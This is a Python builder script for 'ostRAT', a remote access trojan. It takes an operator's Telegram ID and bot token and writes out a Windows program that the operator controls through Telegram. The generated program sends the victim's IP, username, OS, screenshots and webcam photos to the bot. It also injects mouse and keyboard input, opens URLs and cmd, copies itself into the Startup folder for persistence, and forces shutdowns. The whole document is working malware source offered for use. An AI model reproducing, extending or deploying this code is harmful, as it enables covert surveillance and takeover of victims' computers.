"""
:authors: lexek
:license: OSI Approved :: GNU General Public License v3 (GPLv3)
:copyright: (c) 2022 lexek
"""
from colorama import Fore
import os
from sys import platform
def clear():
	if platform == "linux" or platform == "linux2":
		os.system("clear")
	elif platform == "win32":
		os.system('cls')
clear()
print(Fore.GREEN + '++++++++++')
print(Fore.GREEN + '+' + Fore.BLUE +  " ostRAT " + Fore.GREEN + '+')
print(Fore.GREEN + '++++++++++\n')
userid = input(Fore.YELLOW +  "Enter your Telegram ID > ")
token = input(Fore.BLUE +  "Enter bot token > ")

y = open('y.txt', 'w')
y = y.write(r"r'C:\\Users\\' + os.getlogin() + r'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'")

y = open('y.txt', 'r')
y = y.read()

x = open('x.txt', 'w')
x = x.write(r"r'C:\\Users\\' + os.getlogin() + r'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(sys.argv[0])")

x = open('x.txt', 'r')
x = x.read()
def create():
    f = open('system.py', 'w+', encoding='utf-8')
    f.write(f"""import shutil
import platform
import requests
import sys
import cv2 as cv
import os
import webbrowser
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from PIL import ImageColor
from PIL import ImageDraw, ImageGrab
import keyboard 
from aiogram.types import ReplyKeyboardMarkup
import mouse
from bs4 import BeautifulSoup

class WriteState(StatesGroup):
    textcommand = State()

class BindState(StatesGroup):
    bind = State()

class MoveState(StatesGroup):
    MovetoOne = State()
    MovetoTwo = State()

class UrlState(StatesGroup):
    url = State()

class CamState(StatesGroup):
    cam = State()

class YesState(StatesGroup):
    accept = State()

storage=MemoryStorage()
TOKEN = "{token}"
adm = {userid}
bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=storage)

menu = ReplyKeyboardMarkup(resize_keyboard=True)
buttons = ["Online 🟢", "Screenshot 📸", "Off 🔴", "Reoff 🔄", "Autorun 🟢", "Delete 🗑", "Url 🔗", "Сmd 💻", "Cam 🎥", "Keyboard Menu ⭕️⌨️", "Mouse Menu ⭕️🖱"]
menu.add(*buttons)

menukeyboard = ReplyKeyboardMarkup(resize_keyboard=True)
buttonskeyboard = ["Write ✍️", "Hotkeys 🔥", "Back ↩"]
menukeyboard.add(*buttonskeyboard)

menumouse = ReplyKeyboardMarkup(resize_keyboard=True)
buttonsmouse = ["Move 🔀", "Pos 📍", "Left Button Click 🖱️◀️", "Right Button Click 🖱️▶️", "Back ↩"]
menumouse.add(*buttonsmouse)

@dp.message_handler(content_types=['text'], text='Online 🟢')
async def online(message: types.Message):
    response = requests.get('https://myip.ru/index_small.php')
    site = response.text
    soup = BeautifulSoup(site, "lxml")
    IP = soup.find("td").text
    await message.bot.send_message(adm, "🟢 Online! " + "PC » " + os.getlogin() + " OS » " + platform.system() + " " + platform.release() + " " + "IP » " + IP, reply_markup=menu)

@dp.message_handler(content_types=['text'], text='Left Button Click 🖱️◀️')
async def leftbuttonclick(message: types.Message):
    mouse.click()
    await message.bot.send_message(adm, "Left mouse button is click! ✔️")

@dp.message_handler(content_types=['text'], text='Right Button Click 🖱️▶️')
async def rightbuttonclick(message: types.Message):
    mouse.right_click()
    await message.bot.send_message(adm, "Right mouse button is click! ✔️")

@dp.message_handler(content_types=['text'], text='Mouse Menu ⭕️🖱')
async def mousemenu(message: types.Message):
    await message.bot.send_message(adm, "Mouse menu is open! ✔️", reply_markup=menumouse)

@dp.message_handler(content_types=['text'], text='Pos 📍')
async def pos(message: types.Message):
    await message.bot.send_message(adm, mouse.get_position())

@dp.message_handler(content_types=['text'], text='Move 🔀')
async def move(message: types.Message):
    await message.bot.send_message(adm, "Enter first number: ")
    await MoveState.MovetoOne.set()

@dp.message_handler(state=MoveState.MovetoOne)
async def move2(message: types.Message, state: FSMContext):
    await state.update_data(movetwoone=message.text)
    await message.answer("Enter second number: ")
    await MoveState.MovetoTwo.set()

@dp.message_handler(state=MoveState.MovetoTwo)
async def move3(message: types.Message, state: FSMContext):
    await state.update_data(movetotwo=message.text)
    data = await state.get_data()
    num1 = data['movetwoone']
    num2 = data['movetotwo']
    mouse.move(int(num1), int(num2), absolute=True, duration=0.1)

    await message.bot.send_message(adm, "Send! ✔️")
    await state.finish()

@dp.message_handler(content_types=['text'], text='Hotkeys 🔥')
async def hotkey(message: types.Message):
    await message.bot.send_message(adm, "Enter hotkey(button1+button2): ")
    await BindState.bind.set()

@dp.message_handler(state=BindState.bind)
async def hotkey2(message: types.Message, state: FSMContext):
    await state.update_data(bindm=message.text)
    bindm = message.text
    keyboard.press(bindm)
    keyboard.release(bindm)
    await message.bot.send_message(adm, "Send! ✔️")
    await state.finish()


@dp.message_handler(content_types=['text'], text='Write ✍️')
async def write(message: types.Message):
    await message.bot.send_message(adm, "Enter text: ")
    await WriteState.textcommand.set()

@dp.message_handler(state=WriteState.textcommand)
async def write2(message: types.Message, state: FSMContext):
    await state.update_data(textm=message.text)
    textm = message.text
    keyboard.write(textm.replace("/write ", ""))
    await message.bot.send_message(adm, "Send! ✔️")
    await state.finish()

@dp.message_handler(content_types=['text'], text='Back ↩')
async def back(message: types.Message):
    await message.bot.send_message(adm, "Standart menu is open! ✔️", reply_markup=menu)

@dp.message_handler(content_types=['text'], text='Keyboard Menu ⭕️⌨️')
async def keyboardmenu(message: types.Message):
    await message.bot.send_message(adm, "Keyboard menu is open! ✔️", reply_markup=menukeyboard)

@dp.message_handler(content_types=['text'], text='Cam 🎥')
async def camera(message: types.Message):
    cam = message.text
    cam = cv.VideoCapture(0)
    result, image = cam.read()
    if result:
        cv.imwrite("cam.png", image)
        cam = open('cam.png', 'rb')
        await message.reply_photo(cam)
    else:
        await message.bot.send_message(adm, 'Try another web-camera!')

@dp.message_handler(content_types=['text'], text='Сmd 💻')
async def cmd(message: types.Message):
 try:
  os.startfile('cmd.exe')
  await message.bot.send_message(adm, 'Cmd is open! ✔️')
 except:
  await message.bot.send_message(adm, 'Error > RunCMD')

@dp.message_handler(content_types=['text'], text='Url 🔗')
async def url(message: types.Message):
    await message.bot.send_message(adm, "Enter link: ")
    await UrlState.url.set()

@dp.message_handler(state=UrlState.url)
async def url2(message: types.Message, state: FSMContext):
    await state.update_data(urlm=message.text)
    data = await state.get_data()
    url = data['urlm']
    webbrowser.open_new_tab(url)
    await message.bot.send_message(adm, "Link is open! ✔️")
    await state.finish()

@dp.message_handler(content_types=['text'], text='Delete 🗑')
async def delete(message: types.Message):
    await message.bot.send_message(adm, "Confirm delete(y/n): ")
    await YesState.accept.set()

@dp.message_handler(state=YesState.accept)
async def delete2(message: types.Message, state: FSMContext):
    await state.update_data(accept=message.text)
    data = await state.get_data()
    accept = data['accept']
    if accept == "Y" or accept == "y":
        shutil.move(sys.argv[0], 'C:\\ProgramData')
        os.system('taskkill /im ' + os.path.basename(sys.argv[0]) + ' /f')
        await message.bot.send_message(adm, "ostRAT deleted! ✔️")
    elif accept == "N" or accept == "n":
        await message.bot.send_message(adm, 'Delete canceled! ❌', parse_mode="Markdown")
    await state.finish()

@dp.message_handler(content_types=['text'], text='Autorun 🟢')
async def autorun(message: types.Message):
    try:
        shutil.copy2((sys.argv[0]), {y})
        await message.bot.send_message(adm, os.path.basename(sys.argv[0]) + ' in StartUp! ✔️', parse_mode="Markdown")
        os.startfile({x})
        await message.bot.send_message(adm, os.path.basename(sys.argv[0]) + ' runned from StartUp! ✔️', parse_mode="Markdown")
    except:
        await message.bot.send_message(adm, 'Error ❌', reply_markup=menu, parse_mode="Markdown")

@dp.message_handler(content_types=['text'], text='Screenshot 📸')
async def screenshot(message: types.Message):

    position = str(mouse.get_position())
    a = int(''.join(ele for ele in position if ele.isdigit()))
    a = str(a)
    g = a[:3]
    g = int(g)
    b = a
    b = b[3:]
    b = int(b)
    new_image = ImageGrab.grab()
    draw = ImageDraw.Draw(new_image)
    gl = g + 2
    bl = b + 2
    draw.rectangle((g, b, gl, bl), fill=ImageColor.getrgb("red"))
    new_image.save(os.getenv("ProgramData") + '\\Screenshot.jpg')
    new_image = open('C:\\ProgramData\\Screenshot.jpg', 'rb')
    if message.chat.id == adm:
        await message.reply_photo(new_image)
    else:
        pass
    new_image.close()
    try:
        pass
        os.remove('C:\\ProgramData\\Screenshot.jpg')
    except:
        print('Error > Screenshot')

@dp.message_handler(content_types=['text'], text='Off 🔴')
async def off(message: types.Message):
    await message.bot.send_message(adm, "Turn off! ✔️", reply_markup=menu)
    os.system('shutdown -s /t 0 /f')

@dp.message_handler(content_types=['text'], text='Reoff 🔄')
async def reoff(message: types.Message):
    await message.bot.send_message(adm, "Reboot! ✔️", reply_markup=menu)
    os.system('shutdown -r /t 0 /f')

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    if message.chat.id == adm:
        username = message.chat.username
        await message.bot.send_message(adm, "Hi, " + username + ". ostRAT v1.0 for you", reply_markup=menu)
    else:
        await message.reply("Hello, you don't have access.")

try:
  executor.start_polling(dp)
except:
  os.startfile(os.startfile(sys.argv[0]))
  sys.exit()
	""")
    f.close()
    pathtofile = os.getcwd()
    if platform == "linux" or platform == "linux2":
        os.remove(pathtofile + "/x.txt")
        os.remove(pathtofile + "/y.txt")
    elif platform == "win32":
        os.remove(pathtofile + "\\x.txt")
        os.remove(pathtofile + "\\y.txt")
    print("File system.py saved!")
create()
"""
:authors: lexek
:license: OSI Approved :: GNU General Public License v3 (GPLv3)
:copyright: (c) 2022 lexek
"""
#py setup.py sdist #twine upload dist/*